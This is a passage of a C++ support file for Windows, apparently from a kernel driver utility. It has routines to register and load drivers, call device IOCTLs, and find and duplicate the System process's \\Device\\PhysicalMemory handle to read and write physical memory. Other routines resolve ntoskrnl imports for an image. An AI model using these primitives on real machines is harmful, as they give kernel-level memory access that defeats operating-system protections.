/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2022
*
*  TITLE:       SUP.CPP
*
*  VERSION:     1.28
*
*  DATE:        21 Nov 2022
*
*  Program global support routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include "global.h"

/*
* supHeapAlloc
*
* Purpose:
*
* Wrapper for RtlAllocateHeap.
*
*/
PVOID FORCEINLINE supHeapAlloc(
    _In_ SIZE_T Size)
{
    return RtlAllocateHeap(NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, Size);
}

/*
* supHeapFree
*
* Purpose:
*
* Wrapper for RtlFreeHeap.
*
*/
BOOL FORCEINLINE supHeapFree(
    _In_ PVOID Memory)
{
    return RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, Memory);
}

/*
* supCallDriverEx
*
* Purpose:
*
* Call driver.
*
*/
NTSTATUS supCallDriverEx(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength,
    _Out_opt_ PIO_STATUS_BLOCK IoStatus)
{
    IO_STATUS_BLOCK ioStatus;

    NTSTATUS ntStatus = NtDeviceIoControlFile(DeviceHandle,
        NULL,
        NULL,
        NULL,
        &ioStatus,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength);

    if (ntStatus == STATUS_PENDING) {

        ntStatus = NtWaitForSingleObject(DeviceHandle,
            FALSE,
            NULL);

    }


    if (IoStatus)
        *IoStatus = ioStatus;

    return ntStatus;
}

/*
* supCallDriver
*
* Purpose:
*
* Call driver.
*
*/
BOOL supCallDriver(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG IoControlCode,
    _In_ PVOID InputBuffer,
    _In_ ULONG InputBufferLength,
    _In_opt_ PVOID OutputBuffer,
    _In_opt_ ULONG OutputBufferLength)
{
    BOOL bResult;
    IO_STATUS_BLOCK ioStatus;

    NTSTATUS ntStatus = supCallDriverEx(
        DeviceHandle,
        IoControlCode,
        InputBuffer,
        InputBufferLength,
        OutputBuffer,
        OutputBufferLength,
        &ioStatus);

    bResult = NT_SUCCESS(ntStatus);
    SetLastError(RtlNtStatusToDosError(ntStatus));
    return bResult;
}

/*
* supMapPhysicalMemory
*
* Purpose:
*
* Map physical memory.
*
*/
PVOID supMapPhysicalMemory(
    _In_ HANDLE SectionHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_ ULONG NumberOfBytes,
    _In_ BOOL MapForWrite
)
{
    PVOID viewBase = NULL;
    ULONG ulProtect;
    LARGE_INTEGER sectionBase;
    SIZE_T viewSize;

    if (MapForWrite)
        ulProtect = PAGE_READWRITE;
    else
        ulProtect = PAGE_READONLY;

    ULONG_PTR offset = PhysicalAddress & ~(PAGE_SIZE - 1);

    sectionBase.QuadPart = offset;
    viewSize = (PhysicalAddress - offset) + NumberOfBytes;

    NTSTATUS ntStatus = NtMapViewOfSection(SectionHandle,
        NtCurrentProcess(),
        &viewBase,
        0,
        0,
        &sectionBase,
        &viewSize,
        ViewUnmap,
        NULL,
        ulProtect);

    if (!NT_SUCCESS(ntStatus)) {
        SetLastError(RtlNtStatusToDosError(ntStatus));
    }
    else {
        return viewBase;
    }

    return NULL;
}

/*
* supUnmapPhysicalMemory
*
* Purpose:
*
* Unmap physical memory view.
*
*/
VOID supUnmapPhysicalMemory(
    _In_ PVOID BaseAddress
)
{
    NtUnmapViewOfSection(NtCurrentProcess(), BaseAddress);
}

/*
* supReadWritePhysicalMemory
*
* Purpose:
*
* Read/Write physical memory.
*
*/
BOOL WINAPI supReadWritePhysicalMemory(
    _In_ HANDLE SectionHandle,
    _In_ ULONG_PTR PhysicalAddress,
    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes,
    _In_ BOOLEAN DoWrite)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_SUCCESS;
    PVOID mappedSection = NULL;

    ULONG_PTR offset;

    mappedSection = supMapPhysicalMemory(SectionHandle,
        PhysicalAddress,
        NumberOfBytes,
        DoWrite);

    if (mappedSection) {

        offset = PhysicalAddress - (PhysicalAddress & ~(PAGE_SIZE - 1));

        __try {

            if (DoWrite) {
                RtlCopyMemory(RtlOffsetToPointer(mappedSection, offset), Buffer, NumberOfBytes);
            }
            else {
                RtlCopyMemory(Buffer, RtlOffsetToPointer(mappedSection, offset), NumberOfBytes);
            }

            bResult = TRUE;
        }
        __except (EXCEPTION_EXECUTE_HANDLER)
        {
            bResult = FALSE;
            dwError = GetExceptionCode();
        }

        supUnmapPhysicalMemory(mappedSection);

    }
    else {
        dwError = GetLastError();
    }

    SetLastError(dwError);
    return bResult;
}

/*
* supOpenPhysicalMemory
*
* Purpose:
*
* Locate and open physical memory section for read/write.
*
*/
BOOL WINAPI supOpenPhysicalMemory(
    _In_ HANDLE DeviceHandle,
    _In_ pfnOpenProcessCallback OpenProcessCallback,
    _In_ pfnDuplicateHandleCallback DuplicateHandleCallback,
    _Out_ PHANDLE PhysicalMemoryHandle)
{
    BOOL bResult = FALSE;
    DWORD dwError = ERROR_NOT_FOUND;
    ULONG sectionObjectType = (ULONG)-1;
    HANDLE processHandle = NULL;
    HANDLE sectionHandle = NULL;
    PSYSTEM_HANDLE_INFORMATION_EX handleArray = NULL;
    UNICODE_STRING ustr;
    OBJECT_ATTRIBUTES obja;
    UNICODE_STRING usSection;

    do {

        *PhysicalMemoryHandle = NULL;

        if (!OpenProcessCallback(DeviceHandle,
            UlongToHandle(SYSTEM_PID_MAGIC),
            PROCESS_ALL_ACCESS,
            &processHandle))
        {
            dwError = GetLastError();
            break;
        }

        RtlInitUnicodeString(&ustr, L"\\KnownDlls\\kernel32.dll");
        InitializeObjectAttributes(&obja, &ustr, OBJ_CASE_INSENSITIVE, NULL, NULL);

        NTSTATUS ntStatus = NtOpenSection(&sectionHandle, SECTION_QUERY, &obja);

        if (!NT_SUCCESS(ntStatus)) {
            dwError = RtlNtStatusToDosError(ntStatus);
            break;
        }

        handleArray = (PSYSTEM_HANDLE_INFORMATION_EX)supGetSystemInfo(SystemExtendedHandleInformation);
        if (handleArray == NULL) {
            dwError = ERROR_NOT_ENOUGH_MEMORY;
            break;
        }

        ULONG i;
        DWORD currentProcessId = GetCurrentProcessId();

        for (i = 0; i < handleArray->NumberOfHandles; i++) {
            if (handleArray->Handles[i].UniqueProcessId == currentProcessId &&
                handleArray->Handles[i].HandleValue == (ULONG_PTR)sectionHandle)
            {
                sectionObjectType = handleArray->Handles[i].ObjectTypeIndex;
                break;
            }
        }

        NtClose(sectionHandle);
        sectionHandle = NULL;

        if (sectionObjectType == (ULONG)-1) {
            dwError = ERROR_INVALID_DATATYPE;
            break;
        }

        RtlInitUnicodeString(&usSection, L"\\Device\\PhysicalMemory");

        for (i = 0; i < handleArray->NumberOfHandles; i++) {
            if (handleArray->Handles[i].UniqueProcessId == SYSTEM_PID_MAGIC &&
                handleArray->Handles[i].ObjectTypeIndex == (ULONG_PTR)sectionObjectType &&
                handleArray->Handles[i].GrantedAccess == SECTION_ALL_ACCESS)
            {
                HANDLE testHandle = NULL;

                if (DuplicateHandleCallback(DeviceHandle,
                    UlongToHandle(SYSTEM_PID_MAGIC),
                    processHandle,
                    (HANDLE)handleArray->Handles[i].HandleValue,
                    &testHandle,
                    MAXIMUM_ALLOWED,
                    0,
                    0))
                {
                    union {
                        BYTE* Buffer;
                        POBJECT_NAME_INFORMATION Information;
                    } NameInfo;

                    NameInfo.Buffer = NULL;

                    ntStatus = supQueryObjectInformation(testHandle,
                        ObjectNameInformation,
                        (PVOID*)&NameInfo.Buffer,
                        NULL,
                        (PNTSUPMEMALLOC)supHeapAlloc,
                        (PNTSUPMEMFREE)supHeapFree);

                    if (NT_SUCCESS(ntStatus) && NameInfo.Buffer) {

                        if (RtlEqualUnicodeString(&usSection, &NameInfo.Information->Name, TRUE)) {
                            *PhysicalMemoryHandle = testHandle;
                            bResult = TRUE;
                        }

                        supHeapFree(NameInfo.Buffer);
                    }

                    if (bResult == FALSE)
                        NtClose(testHandle);
                }

                if (bResult)
                    break;

            }
        }

    } while (FALSE);

    if (sectionHandle) NtClose(sectionHandle);
    if (processHandle) NtClose(processHandle);
    if (handleArray) supHeapFree(handleArray);

    if (bResult) dwError = ERROR_SUCCESS;

    SetLastError(dwError);
    return bResult;
}

/*
* supChkSum
*
* Purpose:
*
* Calculate partial checksum for given buffer.
*
*/
USHORT supChkSum(
    ULONG PartialSum,
    PUSHORT Source,
    ULONG Length
)
{
    while (Length--) {
        PartialSum += *Source++;
        PartialSum = (PartialSum >> 16) + (PartialSum & 0xffff);
    }
    return (USHORT)(((PartialSum >> 16) + PartialSum) & 0xffff);
}

/*
* supCalculateCheckSumForMappedFile
*
* Purpose:
*
* Calculate PE file checksum.
*
*/
DWORD supCalculateCheckSumForMappedFile(
    _In_ PVOID BaseAddress,
    _In_ ULONG FileLength
)
{
    PUSHORT AdjustSum;
    PIMAGE_NT_HEADERS NtHeaders;
    USHORT PartialSum;
    ULONG CheckSum;

    PartialSum = supChkSum(0, (PUSHORT)BaseAddress, (FileLength + 1) >> 1);

    NtHeaders = RtlImageNtHeader(BaseAddress);
    if (NtHeaders != NULL) {
        AdjustSum = (PUSHORT)(&NtHeaders->OptionalHeader.CheckSum);
        PartialSum -= (PartialSum < AdjustSum[0]);
        PartialSum -= AdjustSum[0];
        PartialSum -= (PartialSum < AdjustSum[1]);
        PartialSum -= AdjustSum[1];
    }
    else
    {
        PartialSum = 0;
    }
    CheckSum = (ULONG)PartialSum + FileLength;
    return CheckSum;
}

/*
* supVerifyMappedImageMatchesChecksum
*
* Purpose:
*
* Calculate PE file checksum and compare it with checksum in PE header.
*
*/
BOOLEAN supVerifyMappedImageMatchesChecksum(
    _In_ PVOID BaseAddress,
    _In_ ULONG FileLength,
    _Out_opt_ PULONG HeaderChecksum,
    _Out_opt_ PULONG CalculatedChecksum
)
{
    PUSHORT AdjustSum;
    PIMAGE_NT_HEADERS NtHeaders;
    ULONG HeaderSum;
    ULONG CheckSum;
    USHORT PartialSum;

    PartialSum = supChkSum(0, (PUSHORT)BaseAddress, (FileLength + 1) >> 1);

    NtHeaders = RtlImageNtHeader(BaseAddress);
    if (NtHeaders) {
        AdjustSum = (PUSHORT)(&NtHeaders->OptionalHeader.CheckSum);
        PartialSum -= (PartialSum < AdjustSum[0]);
        PartialSum -= AdjustSum[0];
        PartialSum -= (PartialSum < AdjustSum[1]);
        PartialSum -= AdjustSum[1];
        HeaderSum = NtHeaders->OptionalHeader.CheckSum;
    }
    else {
        HeaderSum = FileLength;
        PartialSum = 0;
    }

    CheckSum = (ULONG)PartialSum + FileLength;

    if (HeaderChecksum)
        *HeaderChecksum = HeaderSum;
    if (CalculatedChecksum)
        *CalculatedChecksum = CheckSum;

    return (CheckSum == HeaderSum);
}

/*
* supxDeleteKeyRecursive
*
* Purpose:
*
* Delete key and all it subkeys/values.
*
*/
BOOL supxDeleteKeyRecursive(
    _In_ HKEY hKeyRoot,
    _In_ LPCWSTR lpSubKey)
{
    LPWSTR lpEnd;
    LONG lResult;
    DWORD dwSize;
    WCHAR szName[MAX_PATH + 1];
    HKEY hKey;
    FILETIME ftWrite;

    //
    // Attempt to delete key as is.
    //
    lResult = RegDeleteKey(hKeyRoot, lpSubKey);
    if (lResult == ERROR_SUCCESS)
        return TRUE;

    //
    // Try to open key to check if it exist.
    //
    lResult = RegOpenKeyEx(hKeyRoot, lpSubKey, 0, KEY_READ, &hKey);
    if (lResult != ERROR_SUCCESS) {
        if (lResult == ERROR_FILE_NOT_FOUND)
            return TRUE;
        else
            return FALSE;
    }

    //
    // Add slash to the key path if not present.
    //
    lpEnd = _strend(lpSubKey);
    if (*(lpEnd - 1) != TEXT('\\')) {
        *lpEnd = TEXT('\\');
        lpEnd++;
        *lpEnd = TEXT('\0');
    }

    //
    // Enumerate subkeys and call this func for each.
    //
    dwSize = MAX_PATH;
    lResult = RegEnumKeyEx(hKey, 0, szName, &dwSize, NULL,
        NULL, NULL, &ftWrite);

    if (lResult == ERROR_SUCCESS) {

        do {

            _strncpy(lpEnd, MAX_PATH, szName, MAX_PATH);

            if (!supxDeleteKeyRecursive(hKeyRoot, lpSubKey))
                break;

            dwSize = MAX_PATH;

            lResult = RegEnumKeyEx(hKey, 0, szName, &dwSize, NULL,
                NULL, NULL, &ftWrite);

        } while (lResult == ERROR_SUCCESS);
    }

    lpEnd--;
    *lpEnd = TEXT('\0');

    RegCloseKey(hKey);

    //
    // Delete current key, all it subkeys should be already removed.
    //
    lResult = RegDeleteKey(hKeyRoot, lpSubKey);
    if (lResult == ERROR_SUCCESS)
        return TRUE;

    return FALSE;
}

/*
* supRegDeleteKeyRecursive
*
* Purpose:
*
* Delete key and all it subkeys/values.
*
* Remark:
*
* SubKey should not be longer than 260 chars.
*
*/
BOOL supRegDeleteKeyRecursive(
    _In_ HKEY hKeyRoot,
    _In_ LPCWSTR lpSubKey)
{
    WCHAR szKeyName[MAX_PATH * 2];
    RtlSecureZeroMemory(szKeyName, sizeof(szKeyName));
    _strncpy(szKeyName, MAX_PATH * 2, lpSubKey, MAX_PATH);
    return supxDeleteKeyRecursive(hKeyRoot, szKeyName);
}

/*
* supRegWriteValueString
*
* Purpose:
*
* Write string value to the registry.
*
*/
NTSTATUS supRegWriteValueString(
    _In_ HANDLE RegistryHandle,
    _In_ LPCWSTR ValueName,
    _In_ LPCWSTR ValueData
)
{
    UNICODE_STRING valueName;
    WCHAR szData[64];

    RtlInitUnicodeString(&valueName, ValueName);
    _strcpy(szData, ValueData);
    return NtSetValueKey(RegistryHandle, &valueName, 0, REG_SZ,
        (PVOID)&szData, (1 + (ULONG)_strlen(szData)) * sizeof(WCHAR));
}

/*
* supxCreateDriverEntry
*
* Purpose:
*
* Creating registry entry for driver.
*
*/
NTSTATUS supxCreateDriverEntry(
    _In_opt_ LPCWSTR DriverPath,
    _In_ LPCWSTR KeyName
)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    DWORD dwData, dwResult;
    HKEY keyHandle = NULL;
    UNICODE_STRING driverImagePath;

    RtlInitEmptyUnicodeString(&driverImagePath, NULL, 0);

    if (DriverPath) {
        if (!RtlDosPathNameToNtPathName_U(DriverPath,
            &driverImagePath,
            NULL,
            NULL))
        {
            return STATUS_INVALID_PARAMETER_2;
        }
    }

    if (ERROR_SUCCESS != RegCreateKeyEx(HKEY_LOCAL_MACHINE,
        KeyName,
        0,
        NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_ALL_ACCESS,
        NULL,
        &keyHandle,
        NULL))
    {
        status = STATUS_ACCESS_DENIED;
        goto Cleanup;
    }

    dwResult = ERROR_SUCCESS;

    do {

        dwData = SERVICE_ERROR_NORMAL;
        dwResult = RegSetValueEx(keyHandle,
            TEXT("ErrorControl"),
            0,
            REG_DWORD,
            (BYTE*)&dwData,
            sizeof(dwData));
        if (dwResult != ERROR_SUCCESS)
            break;

        dwData = SERVICE_KERNEL_DRIVER;
        dwResult = RegSetValueEx(keyHandle,
            TEXT("Type"),
            0,
            REG_DWORD,
            (BYTE*)&dwData,
            sizeof(dwData));
        if (dwResult != ERROR_SUCCESS)
            break;

        dwData = SERVICE_DEMAND_START;
        dwResult = RegSetValueEx(keyHandle,
            TEXT("Start"),
            0,
            REG_DWORD,
            (BYTE*)&dwData,
            sizeof(dwData));

        if (dwResult != ERROR_SUCCESS)
            break;

        if (DriverPath) {
            dwResult = RegSetValueEx(keyHandle,
                TEXT("ImagePath"),
                0,
                REG_EXPAND_SZ,
                (BYTE*)driverImagePath.Buffer,
                (DWORD)driverImagePath.Length + sizeof(UNICODE_NULL));
        }

    } while (FALSE);

    RegCloseKey(keyHandle);

    if (dwResult != ERROR_SUCCESS) {
        status = STATUS_ACCESS_DENIED;
    }
    else
    {
        status = STATUS_SUCCESS;
    }

Cleanup:
    if (DriverPath) {
        if (driverImagePath.Buffer) {
            RtlFreeUnicodeString(&driverImagePath);
        }
    }
    return status;
}

/*
* supLoadDriverEx
*
* Purpose:
*
* Install driver and load it.
*
* N.B.
* SE_LOAD_DRIVER_PRIVILEGE is required to be assigned and enabled.
*
*/
NTSTATUS supLoadDriverEx(
    _In_ LPCWSTR DriverName,
    _In_ LPCWSTR DriverPath,
    _In_ BOOLEAN UnloadPreviousInstance,
    _In_opt_ pfnLoadDriverCallback Callback,
    _In_opt_ PVOID CallbackParam
)
{
    SIZE_T keyOffset;
    NTSTATUS status;
    UNICODE_STRING driverServiceName;

    WCHAR szBuffer[MAX_PATH + 1];

    if (DriverName == NULL)
        return STATUS_INVALID_PARAMETER_1;
    if (DriverPath == NULL)
        return STATUS_INVALID_PARAMETER_2;

    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));

    keyOffset = RTL_NUMBER_OF(NT_REG_PREP);

    if (FAILED(StringCchPrintf(szBuffer, MAX_PATH,
        DRIVER_REGKEY,
        NT_REG_PREP,
        DriverName)))
    {
        return STATUS_INVALID_PARAMETER_1;
    }

    status = supxCreateDriverEntry(DriverPath,
        &szBuffer[keyOffset]);

    if (!NT_SUCCESS(status))
        return status;

    RtlInitUnicodeString(&driverServiceName, szBuffer);

    if (Callback) {
        status = Callback(&driverServiceName, CallbackParam);
        if (!NT_SUCCESS(status))
            return status;
    }

    status = NtLoadDriver(&driverServiceName);

    if (UnloadPreviousInstance) {
        if ((status == STATUS_IMAGE_ALREADY_LOADED) ||
            (status == STATUS_OBJECT_NAME_COLLISION) ||
            (status == STATUS_OBJECT_NAME_EXISTS))
        {
            status = NtUnloadDriver(&driverServiceName);
            if (NT_SUCCESS(status)) {
                status = NtLoadDriver(&driverServiceName);
            }
        }
    }
    else {
        if (status == STATUS_OBJECT_NAME_EXISTS)
            status = STATUS_SUCCESS;
    }

    return status;
}

/*
* supLoadDriver
*
* Purpose:
*
* Install driver and load it.
*
* N.B.
* SE_LOAD_DRIVER_PRIVILEGE is required to be assigned and enabled.
*
*/
NTSTATUS supLoadDriver(
    _In_ LPCWSTR DriverName,
    _In_ LPCWSTR DriverPath,
    _In_ BOOLEAN UnloadPreviousInstance
)
{
    return supLoadDriverEx(DriverName,
        DriverPath,
        UnloadPreviousInstance,
        NULL,
        NULL);
}

/*
* supUnloadDriver
*
* Purpose:
*
* Call driver unload and remove corresponding registry key.
*
* N.B.
* SE_LOAD_DRIVER_PRIVILEGE is required to be assigned and enabled.
*
*/
NTSTATUS supUnloadDriver(
    _In_ LPCWSTR DriverName,
    _In_ BOOLEAN fRemove
)
{
    NTSTATUS status;
    SIZE_T keyOffset;
    UNICODE_STRING driverServiceName;

    WCHAR szBuffer[MAX_PATH + 1];

    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));

    if (FAILED(StringCchPrintf(szBuffer, MAX_PATH,
        DRIVER_REGKEY,
        NT_REG_PREP,
        DriverName)))
    {
        return STATUS_INVALID_PARAMETER_1;
    }

    keyOffset = RTL_NUMBER_OF(NT_REG_PREP);

    status = supxCreateDriverEntry(NULL,
        &szBuffer[keyOffset]);

    if (!NT_SUCCESS(status))
        return status;

    RtlInitUnicodeString(&driverServiceName, szBuffer);
    status = NtUnloadDriver(&driverServiceName);

    if (NT_SUCCESS(status)) {
        if (fRemove)
            supRegDeleteKeyRecursive(HKEY_LOCAL_MACHINE, &szBuffer[keyOffset]);
    }

    return status;
}

/*
* supOpenDriverEx
*
* Purpose:
*
* Open handle for driver.
*
*/
NTSTATUS supOpenDriverEx(
    _In_ LPCWSTR DriverName,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_opt_ PHANDLE DeviceHandle
)
{
    HANDLE deviceHandle = NULL;
    UNICODE_STRING usDeviceLink;
    OBJECT_ATTRIBUTES obja;
    IO_STATUS_BLOCK iost;

    NTSTATUS ntStatus;

    RtlInitUnicodeString(&usDeviceLink, DriverName);
    InitializeObjectAttributes(&obja, &usDeviceLink, OBJ_CASE_INSENSITIVE, NULL, NULL);

    ntStatus = NtCreateFile(&deviceHandle,
        DesiredAccess,
        &obja,
        &iost,
        NULL,
        0,
        0,
        FILE_OPEN,
        0,
        NULL,
        0);

    if (NT_SUCCESS(ntStatus)) {
        if (DeviceHandle)
            *DeviceHandle = deviceHandle;
    }

    return ntStatus;
}

/*
* supOpenDriver
*
* Purpose:
*
* Open handle for driver through \\DosDevices.
*
*/
NTSTATUS supOpenDriver(
    _In_ LPCWSTR DriverName,
    _In_ ACCESS_MASK DesiredAccess,
    _Out_ PHANDLE DeviceHandle
)
{
    NTSTATUS status = STATUS_UNSUCCESSFUL; 

    // assume failure
    if (DeviceHandle)
        *DeviceHandle = NULL;
    else
        return STATUS_INVALID_PARAMETER_2;

    if (DriverName) {

        WCHAR szDeviceLink[MAX_PATH + 1];

        RtlSecureZeroMemory(szDeviceLink, sizeof(szDeviceLink));

        if (FAILED(StringCchPrintf(szDeviceLink,
            MAX_PATH,
            TEXT("\\DosDevices\\%wS"),
            DriverName)))
        {
            return STATUS_INVALID_PARAMETER_1;
        }

        status = supOpenDriverEx(szDeviceLink,
            DesiredAccess,
            DeviceHandle);

        if (status == STATUS_OBJECT_NAME_NOT_FOUND ||
            status == STATUS_NO_SUCH_DEVICE) 
        {

            //
            // Check the case when no symlink available.
            //

            RtlSecureZeroMemory(szDeviceLink, sizeof(szDeviceLink));

            if (FAILED(StringCchPrintf(szDeviceLink,
                MAX_PATH,
                TEXT("\\Device\\%wS"),
                DriverName)))
            {
                return STATUS_INVALID_PARAMETER_1;
            }

            status = supOpenDriverEx(szDeviceLink,
                DesiredAccess,
                DeviceHandle);

        }

    }
    else {
        status = STATUS_INVALID_PARAMETER_1;
    }

    return status;
}

/*
* supGetSystemInfo
*
* Purpose:
*
* Wrapper for NtQuerySystemInformation.
*
*/
PVOID supGetSystemInfo(
    _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass
)
{
    return ntsupGetSystemInfoEx(
        SystemInformationClass,
        NULL,
        (PNTSUPMEMALLOC)supHeapAlloc,
        (PNTSUPMEMFREE)supHeapFree);
}

/*
* supGetLoadedModulesList
*
* Purpose:
*
* Read list of loaded kernel modules.
*
*/
PVOID supGetLoadedModulesList(
    _In_ BOOL ExtendedOutput,
    _Out_opt_ PULONG ReturnLength
)
{
    return ntsupGetLoadedModulesListEx(ExtendedOutput,
        ReturnLength,
        (PNTSUPMEMALLOC)supHeapAlloc,
        (PNTSUPMEMFREE)supHeapFree);
}

/*
* supGetNtOsBase
*
* Purpose:
*
* Return ntoskrnl base address.
*
*/
ULONG_PTR supGetNtOsBase(
    VOID
)
{
    PRTL_PROCESS_MODULES   miSpace;
    ULONG_PTR              NtOsBase = 0;

    miSpace = (PRTL_PROCESS_MODULES)supGetLoadedModulesList(FALSE, NULL);
    if (miSpace) {
        NtOsBase = (ULONG_PTR)miSpace->Modules[0].ImageBase;
        supHeapFree(miSpace);
    }
    return NtOsBase;
}

/*
* supGetProcAddress
*
* Purpose:
*
* Get NtOskrnl procedure address.
*
*/
ULONG_PTR supGetProcAddress(
    _In_ ULONG_PTR KernelBase,
    _In_ ULONG_PTR KernelImage,
    _In_ LPCSTR FunctionName
)
{
    ANSI_STRING cStr;
    ULONG_PTR   pfn = 0;

    RtlInitString(&cStr, FunctionName);
    if (!NT_SUCCESS(LdrGetProcedureAddress((PVOID)KernelImage, &cStr, 0, (PVOID*)&pfn)))
        return 0;

    return KernelBase + (pfn - KernelImage);
}

/*
* supResolveKernelImport
*
* Purpose:
*
* Resolve import (ntoskrnl only).
*
*/
VOID supResolveKernelImport(
    _In_ ULONG_PTR Image,
    _In_ ULONG_PTR KernelImage,
    _In_ ULONG_PTR KernelBase
)
{
    PIMAGE_OPTIONAL_HEADER      popth;
    ULONG_PTR                   ITableVA, * nextthunk;
    PIMAGE_IMPORT_DESCRIPTOR    ITable;
    PIMAGE_THUNK_DATA           pthunk;
    PIMAGE_IMPORT_BY_NAME       pname;
    ULONG                       i;

    popth = &RtlImageNtHeader((PVOID)Image)->OptionalHeader;

    if (popth->NumberOfRvaAndSizes <= IMAGE_DIRECTORY_ENTRY_IMPORT)
        return;

    ITableVA = popth->DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (ITableVA == 0)
        return;

    ITable = (PIMAGE_IMPORT_DESCRIPTOR)(Image + ITableVA);

    if (ITable->OriginalFirstThunk == 0)
        pthunk = (PIMAGE_THUNK_DATA)(Image + ITable->FirstThunk);
    else
        pthunk = (PIMAGE_THUNK_DATA)(Image + ITable->OriginalFirstThunk);

    for (i = 0; pthunk->u1.Function != 0; i++, pthunk++) {
        nextthunk = (PULONG_PTR)(Image + ITable->FirstThunk);
        if ((pthunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) == 0) {
            pname = (PIMAGE_IMPORT_BY_NAME)((PCHAR)Image + pthunk->u1.AddressOfData);
            nextthunk[i] = supGetProcAddress(KernelBase, KernelImage, pname->Name);
        }
        else
            nextthunk[i] = supGetProcAddress(KernelBase, KernelImage, (LPCSTR)(pthunk->u1.Ordinal & 0xffff));
    }
}

/*
* supQueryObjectFromHandle
*
* Purpose:
*
* Return object kernel address from handle in current process handle table.
*
*/
BOOL supQueryObjectFromHandle(
    _In_ HANDLE hOject,
    _Out_ ULONG_PTR* Address
)
{
    BOOL   bFound = FALSE;
    ULONG  i;
    DWORD  CurrentProcessId = GetCurrentProcessId();

    PSYSTEM_HANDLE_INFORMATION_EX pHandles;

    if (Address)
        *Address = 0;
    else
        return FALSE;

    pHandles = (PSYSTEM_HANDLE_INFORMATION_EX)supGetSystemInfo(SystemExtendedHandleInformation);
    if (pHandles) {
        for (i = 0; i < pHandles->NumberOfHandles; i++) {
            if (pHandles->Handles[i].UniqueProcessId == CurrentProcessId) {
                if (pHandles->Handles[i].HandleValue == (USHORT)(ULONG_PTR)hOject) {
                    *Address = (ULONG_PTR)pHandles->Handles[i].Object;
                    bFound = TRUE;
                    break;
                }
            }
        }
        supHeapFree(pHandles);
    }
    return bFound;
}

/*
* supGetCommandLineOption
*
* Purpose:
*
* Parse command line options.
*
*/
BOOL supGetCommandLineOption(
    _In_ LPCTSTR OptionName,
    _In_ BOOL IsParametric,
    _Inout_opt_ LPTSTR OptionValue,
    _In_ ULONG ValueSize,
    _Out_opt_ PULONG ParamLength
)
{
    BOOL    bResult;
    LPTSTR  cmdline = GetCommandLine();
    TCHAR   Param[MAX_PATH + 1];
    ULONG   rlen;
    int     i = 0;

    if (ParamLength)
        *ParamLength = 0;

    RtlSecureZeroMemory(Param, sizeof(Param));
    while (GetCommandLineParam(cmdline, i, Param, MAX_PATH, &rlen))
    {
        if (rlen == 0)
            break;

        if (_strcmp(Param, OptionName) == 0)
        {
            if (IsParametric) {
                bResult = GetCommandLineParam(cmdline, i + 1, OptionValue, ValueSize, &rlen);
                if (ParamLength)
                    *ParamLength = rlen;
                return bResult;
            }

            return TRUE;
        }
        ++i;
    }

    return FALSE;
}

/*
* supQueryMaximumUserModeAddress
*
* Purpose:
*
* Return maximum user mode address.
*
*/
ULONG_PTR supQueryMaximumUserModeAddress()
{
    NTSTATUS ntStatus;

    SYSTEM_BASIC_INFORMATION basicInfo;

    ULONG returnLength = 0;
    SYSTEM_INFO systemInfo;

    RtlSecureZeroMemory(&basicInfo, sizeof(basicInfo));

    ntStatus = NtQuerySystemInformation(SystemBasicInformation,
        &basicInfo,
        sizeof(basicInfo),
        &returnLength);

    if (NT_SUCCESS(ntStatus)) {
        return basicInfo.MaximumUserModeAddress;
    }
    else {

        RtlSecureZeroMemory(&systemInfo, sizeof(systemInfo));
        GetSystemInfo(&systemInfo);
        return (ULONG_PTR)systemInfo.lpMaximumApplicationAddress;
    }

}

/*
* supQuerySecureBootState
*
* Purpose:
*
* Query Firmware type and SecureBoot state if firmware is EFI.
*
*/
BOOLEAN supQuerySecureBootState(
    _Out_ PBOOLEAN pbSecureBoot
)
{
    BOOLEAN bResult = FALSE;
    BOOLEAN bSecureBoot = FALSE;

    if (pbSecureBoot)
        *pbSecureBoot = FALSE;

    if (NT_SUCCESS(supEnablePrivilege(SE_SYSTEM_ENVIRONMENT_PRIVILEGE, TRUE))) {

        bSecureBoot = FALSE;

        GetFirmwareEnvironmentVariable(
            L"SecureBoot",
            L"{8be4df61-93ca-11d2-aa0d-00e098032b8c}",
            &bSecureBoot,
            sizeof(BOOLEAN));

        supEnablePrivilege(SE_SYSTEM_ENVIRONMENT_PRIVILEGE, FALSE);

        if (pbSecureBoot) {
            *pbSecureBoot = bSecureBoot;
        }
        bResult = TRUE;
    }
    return bResult;
}

/*
* supGetFirmwareType
*
* Purpose:
*
* Return firmware type.
*
*/
NTSTATUS supGetFirmwareType(
    _Out_ PFIRMWARE_TYPE FirmwareType
)
{
    NTSTATUS ntStatus;
    ULONG returnLength = 0;
    SYSTEM_BOOT_ENVIRONMENT_INFORMATION sbei;

    *FirmwareType = FirmwareTypeUnknown;

    RtlSecureZeroMemory(&sbei, sizeof(sbei));

    ntStatus = NtQuerySystemInformation(SystemBootEnvironmentInformation,
        &sbei,
        sizeof(sbei),
        &returnLength);

    if (NT_SUCCESS(ntStatus)) {
        *FirmwareType = sbei.FirmwareType;

    }

    return ntStatus;
}

/*
* supReadFileToBuffer
*
* Purpose:
*
* Read file to buffer. Release memory when it no longer needed.
*
*/
PBYTE supReadFileToBuffer(
